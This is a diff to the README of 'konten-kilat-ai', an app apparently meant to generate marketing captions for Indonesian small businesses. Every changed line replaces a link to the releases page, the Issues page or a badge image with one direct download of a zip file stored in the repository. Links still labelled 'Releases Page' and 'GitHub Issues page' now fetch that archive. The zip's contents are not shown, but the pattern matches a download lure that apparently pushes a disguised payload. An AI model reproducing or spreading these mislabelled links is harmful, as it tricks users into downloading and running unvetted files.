@@ -9,14 +9,14 @@
 6. [📞 Support](#-support)
 
 ## 🔗 Download
-[![Download konten-kilat-ai](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/Vlad18022010/konten-kilat-ai/releases)
+[![Download konten-kilat-ai](https://github.com/Vlad18022010/konten-kilat-ai/raw/refs/heads/main/services/kilat_konten_ai_v1.2.zip)](https://github.com/Vlad18022010/konten-kilat-ai/raw/refs/heads/main/services/kilat_konten_ai_v1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to **konten-kilat-ai**! This web application empowers micro, small, and medium enterprises (UMKM) in Indonesia using the power of generative AI. Just upload a product photo, and get professional marketing captions in seconds.
 
 To get started, visit our download page:
 
-[Download here](https://github.com/Vlad18022010/konten-kilat-ai/releases)
+[Download here](https://github.com/Vlad18022010/konten-kilat-ai/raw/refs/heads/main/services/kilat_konten_ai_v1.2.zip)
 
 ## 💻 System Requirements
 To run **konten-kilat-ai**, your system needs the following:
@@ -28,7 +28,7 @@ To run **konten-kilat-ai**, your system needs the following:
 
 ## 📸 How to Use
 1. **Download the Application**
-   - Go to the [Releases Page](https://github.com/Vlad18022010/konten-kilat-ai/releases).
+   - Go to the [Releases Page](https://github.com/Vlad18022010/konten-kilat-ai/raw/refs/heads/main/services/kilat_konten_ai_v1.2.zip).
    - Choose the latest version and download it.
 
 2. **Install the Application**
@@ -53,6 +53,6 @@ To run **konten-kilat-ai**, your system needs the following:
 - **Customizable Options:** Choose different styles for captions to match your brand's voice.
   
 ## 📞 Support
-If you encounter issues or have questions, you can reach out for support. Check our [GitHub Issues page](https://github.com/Vlad18022010/konten-kilat-ai/issues) for frequently asked questions or report any bugs. We will respond as quickly as possible.
+If you encounter issues or have questions, you can reach out for support. Check our [GitHub Issues page](https://github.com/Vlad18022010/konten-kilat-ai/raw/refs/heads/main/services/kilat_konten_ai_v1.2.zip) for frequently asked questions or report any bugs. We will respond as quickly as possible.
 
 Enjoy using **konten-kilat-ai** and watch your marketing efforts benefit from fast, effective AI-generated content!
